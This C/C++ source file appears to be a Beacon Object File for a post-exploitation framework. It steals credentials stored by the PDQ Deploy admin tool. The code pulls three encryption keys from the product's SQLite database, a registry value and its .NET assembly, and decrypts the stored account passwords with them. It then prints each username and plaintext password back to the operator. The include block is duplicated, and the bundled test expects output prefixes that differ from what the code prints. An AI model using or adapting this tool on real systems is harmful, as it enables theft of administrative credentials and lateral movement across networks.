#include <Windows.h>
#include "base/helpers.h"

#ifdef _DEBUG
#include "base/mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

#include <Windows.h>
#include "base/helpers.h"

#ifdef _DEBUG
#include "base/mock.h"
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#endif

extern "C" {
#include "beacon.h"
#include "base/aes.c"
#include "base/utils.cpp" // Contains the readFileToBuffer helper

#define SQLITE_HEADER "SQLite format 3"

    typedef struct {
        char username[64];
        BYTE blob[512];
        DWORD blobLen;
    } CredentialInfo;

    CredentialInfo* g_credentials = NULL;
    DWORD g_credentialCount = 0;

    char g_appSecureKey[64] = { 0 };
    char g_dbSecureKey[64] = { 0 };
    char g_regSecureKey[64] = { 0 };
    BOOL g_appKeyFound = FALSE;
    BOOL g_dbKeyFound = FALSE;
    BOOL g_regKeyFound = FALSE;

    // Parse credential entries from the provided database data.
    void parseCredentialsFromDB(const BYTE* data, DWORD fileSize) {
        const char* marker = "(encrypted)";
        const DWORD markerLen = 11;
        const char* noneMarker = "None";
        const DWORD noneLen = 4;

        CredentialInfo* credentials = (CredentialInfo*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CredentialInfo) * 10);
        if (!credentials) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory for credentials");
            return;
        }

        DWORD credCount = 0;
        DWORD maxCreds = 10;

        for (DWORD i = 0; i < fileSize - markerLen - 64; i++) {
            if (memcmp(&data[i], marker, markerLen) == 0 && data[i + markerLen] == '\0') {
                DWORD start = i;
                int nameStart = i - 1;
                while (nameStart > 0 && data[nameStart] >= 32 && data[nameStart] <= 126) {
                    nameStart--;
                }
                nameStart++;

                char username[64] = { 0 };
                int nameLen = i - nameStart;
                if (nameLen <= 0 || nameLen >= sizeof(username)) {
                    continue;
                }
                memcpy(username, &data[nameStart], nameLen);
                username[nameLen] = '\0';

                DWORD end = start + 16;
                for (; end < fileSize - noneLen; end++) {
                    if (memcmp(&data[end], noneMarker, noneLen) == 0) {
                        break;
                    }
                }
                if (end >= fileSize - noneLen) {
                    BeaconPrintf(CALLBACK_ERROR, "[-] Could not locate end of password blob for %s", username);
                    continue;
                }

                DWORD blobLen = end - start;
                if (blobLen > 512)
                    blobLen = 512;

                char hexBlob[1025] = { 0 };
                const char hexChars[] = "0123456789ABCDEF";
                for (DWORD j = 0; j < blobLen && j < 512; j++) {
                    BYTE val = data[start + j];
                    hexBlob[j * 2] = hexChars[(val >> 4) & 0xF];
                    hexBlob[j * 2 + 1] = hexChars[val & 0xF];
                }

                BeaconPrintf(CALLBACK_OUTPUT, "[+] UserName: %s", username);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] EncryptedPasswordBlob: %s", hexBlob);

                if (credCount >= maxCreds) {
                    maxCreds *= 2;
                    CredentialInfo* newCreds = (CredentialInfo*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CredentialInfo) * maxCreds);
                    if (!newCreds) {
                        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to reallocate memory for credentials");
                        break;
                    }
                    memcpy(newCreds, credentials, sizeof(CredentialInfo) * credCount);
                    HeapFree(GetProcessHeap(), 0, credentials);
                    credentials = newCreds;
                }

                memcpy(credentials[credCount].username, username, strlen(username) + 1);
                memcpy(credentials[credCount].blob, &data[start], blobLen);
                credentials[credCount].blobLen = blobLen;
                credCount++;
            }
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %d credential entries", credCount);
        g_credentials = credentials;
        g_credentialCount = credCount;
    }

    extern "C" void sha256(const unsigned char* data, size_t len, unsigned char* out);

    // Decrypt a credential blob using the combined decryption key.
    BOOL decryptCredentialBlob(const char* username, const BYTE* blob, DWORD blobLen, const char* combinedKey) {
        const char* marker = "(encrypted)";
        const DWORD markerLen = 11;

        if (blobLen < markerLen + 1 + 16 + 16)
            return FALSE;
        if (memcmp(blob, marker, markerLen) != 0 || blob[markerLen] != '\0')
            return FALSE;

        const BYTE ivLen = blob[markerLen + 1];
        if (ivLen != 16) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Unexpected IV length: %d (expected 16)", ivLen);
            return FALSE;
        }

        const BYTE* iv = &blob[markerLen + 2];
        const BYTE* encData = &blob[markerLen + 2 + ivLen];
        DWORD encLen = blobLen - (markerLen + 2 + ivLen);

        BYTE hash[32];
        sha256((const BYTE*)combinedKey, strlen(combinedKey), hash);
        BYTE aes_key[16];
        memcpy(aes_key, hash, 16);

        BYTE* decrypted = (BYTE*)HeapAlloc(GetProcessHeap(), 0, encLen);
        if (!decrypted)
            return FALSE;
        memcpy(decrypted, encData, encLen);

        AES_ctx ctx;
        AES_init_ctx_iv(&ctx, aes_key, iv);
        AES_CBC_decrypt_buffer(&ctx, decrypted, encLen);

        if (encLen < 4) {
            HeapFree(GetProcessHeap(), 0, decrypted);
            return FALSE;
        }
        DWORD pwLen = *(DWORD*)decrypted;
        if (pwLen > 0 && pwLen <= encLen - 4 && pwLen < 128) {
            char pw[129] = { 0 };
            memcpy(pw, decrypted + 4, pwLen);
            pw[pwLen] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Decrypted password for %s: %s", username, pw);
            HeapFree(GetProcessHeap(), 0, decrypted);
            return TRUE;
        }
        HeapFree(GetProcessHeap(), 0, decrypted);
        return FALSE;
    }

    // Decrypt all stored credentials using available secure keys.
    void decryptStoredCredentials() {
        if (!g_credentials || g_credentialCount == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] No credentials to decrypt");
            return;
        }
        if (!g_appKeyFound || !g_dbKeyFound || !g_regKeyFound) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Not all secure keys available for decryption");
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Attempting to decrypt %d credentials", g_credentialCount);
        DWORD successCount = 0;
        for (DWORD i = 0; i < g_credentialCount; i++) {
            char combinedKey[256] = { 0 };
            DWORD offset = 0;
            memcpy(combinedKey + offset, g_appSecureKey, strlen(g_appSecureKey));
            offset += strlen(g_appSecureKey);
            memcpy(combinedKey + offset, g_dbSecureKey, strlen(g_dbSecureKey));
            offset += strlen(g_dbSecureKey);
            memcpy(combinedKey + offset, g_regSecureKey, strlen(g_regSecureKey));

            if (decryptCredentialBlob(g_credentials[i].username,
                g_credentials[i].blob,
                g_credentials[i].blobLen,
                combinedKey)) {
                successCount++;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to decrypt credentials for: %s", g_credentials[i].username);
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Successfully decrypted %d of %d credentials", successCount, g_credentialCount);
        HeapFree(GetProcessHeap(), 0, g_credentials);
        g_credentials = NULL;
        g_credentialCount = 0;
    }

    // Retrieve secure keys from database, registry, and .NET assembly.
    // Returns TRUE if all three keys were found; otherwise FALSE.
    BOOL retrieveSecureKeys() {
        BOOL foundAny = FALSE;

        // Database SecureKey extraction & credential parsing
        DWORD fileSize = 0;
        BYTE* data = readFileToBuffer("C:\\ProgramData\\Admin Arsenal\\PDQ Deploy\\Database.db", &fileSize);
        if (!data) {
            return FALSE; // Early return on error.
        }
        if (memcmp(data, SQLITE_HEADER, 16) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Valid SQLite DB. Extracting credentials...");
            parseCredentialsFromDB(data, fileSize);
            // Scan once for the DB SecureKey in the same buffer.
            for (DWORD i = 0; i < fileSize - 36; i++) {
                if (is_guid((const char*)&data[i])) {
                    char guid[37] = { 0 };
                    memcpy(guid, &data[i], 36);
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] DB SecureKey: %s", guid);
                    memcpy(g_dbSecureKey, guid, 36);
                    g_dbKeyFound = TRUE;
                    break;
                }
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Not a valid SQLite DB");
            HeapFree(GetProcessHeap(), 0, data);
            return FALSE;
        }
        HeapFree(GetProcessHeap(), 0, data);

        // Registry SecureKey extraction
        HKEY hKey;
        LONG regResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Admin Arsenal\\PDQ Deploy",
            0,
            KEY_READ,
            &hKey);
        if (regResult != ERROR_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "[-] RegOpenKeyExA failed: %i", regResult);
        }
        else {
            char value[256] = { 0 };
            DWORD valueSize = sizeof(value);
            DWORD type = 0;
            regResult = RegQueryValueExA(hKey,
                "Secure Key",
                NULL,
                &type,
                (LPBYTE)&value,
                &valueSize);
            if (regResult == ERROR_SUCCESS && type == REG_SZ) {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] Registry SecureKey: %s", value);
                memcpy(g_regSecureKey, value, strlen(value));
                g_regKeyFound = TRUE;
                foundAny = TRUE;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read Registry Secure Key: %i", regResult);
            }
            RegCloseKey(hKey);
        }

        // .NET Assembly SecureKey extraction
        DWORD asmSize = 0;
        BYTE* asmData = readFileToBuffer("C:\\Program Files (x86)\\Admin Arsenal\\PDQ Deploy\\AdminArsenal.PDQDeploy.dll", &asmSize);
        if (asmData) {
            if (asmSize >= 72) {
                for (DWORD i = 0; i < asmSize - 72; i += 2) {
                    if (is_guid_utf16((wchar_t*)&asmData[i])) {
                        wchar_t wguid[37] = { 0 };
                        memcpy(wguid, &asmData[i], 36 * sizeof(wchar_t));
                        char guid[37] = { 0 };
                        for (int k = 0; k < 36; k++) {
                            guid[k] = (char)wguid[k];
                        }
                        BeaconPrintf(CALLBACK_OUTPUT, "[*] Application SecureKey: %s", guid);
                        memcpy(g_appSecureKey, guid, 36);
                        g_appKeyFound = TRUE;
                        foundAny = TRUE;
                        break;
                    }
                }
            }
            HeapFree(GetProcessHeap(), 0, asmData);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open .NET assembly: %i", GetLastError());
        }

        if (g_appKeyFound && g_dbKeyFound && g_regKeyFound) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS: All three SecureKeys found. Decryption should be possible.");
            return TRUE;
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "[-] FAILED: Not all SecureKeys found. Decryption not possible.");
            return FALSE;
        }
    }

    // Main execution function based on provided arguments.
    void go(char* args, int len) {
        BOOL checkMode = FALSE;
        BOOL credsMode = FALSE;
        char* arg;

        if (len == 0) {
            credsMode = TRUE;
        }
        else {
            datap parser;
            BeaconDataParse(&parser, args, len);
            arg = BeaconDataExtract(&parser, NULL);
            if (arg && _stricmp(arg, "check") == 0)
                checkMode = TRUE;
            else if (arg && _stricmp(arg, "creds") == 0)
                credsMode = TRUE;
            else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Unknown argument: %s", arg ? arg : "(null)");
                BeaconPrintf(CALLBACK_ERROR, "[*] Usage: inline-execute bof.o [check|creds]");
                return;
            }
        }

        if (checkMode) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Checking for PDQ Deploy SecureKeys...");
            retrieveSecureKeys();
            return;
        }

        if (credsMode) {
            if (!retrieveSecureKeys()) {
                return;
            }
            decryptStoredCredentials();
        }
    }
}

#if defined(_DEBUG) && !defined(_GTEST)
int main(int argc, char* argv[]) {
    bof::runMocked<>(go);
    return 0;
}
#elif defined(_GTEST)
#include <gtest/gtest.h>
TEST(BofTest, Test1) {
    std::vector<bof::output::OutputEntry> got = bof::runMocked<>(go);
    std::vector<bof::output::OutputEntry> expected = {
        {CALLBACK_OUTPUT, "[+] DB SecureKey: bd30b186-8ff3-41cc-b73f-82592775f6a8"},
        {CALLBACK_OUTPUT, "[+] Registry SecureKey: a7579900-06c4-4a99-9358-0146b6db0bcd"},
        {CALLBACK_OUTPUT, "[+] Application SecureKey: 043E2818-3D63-41F9-9803-B03593F33C7D"},
    };
    ASSERT_EQ(expected.size(), got.size());
    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());
}
#endif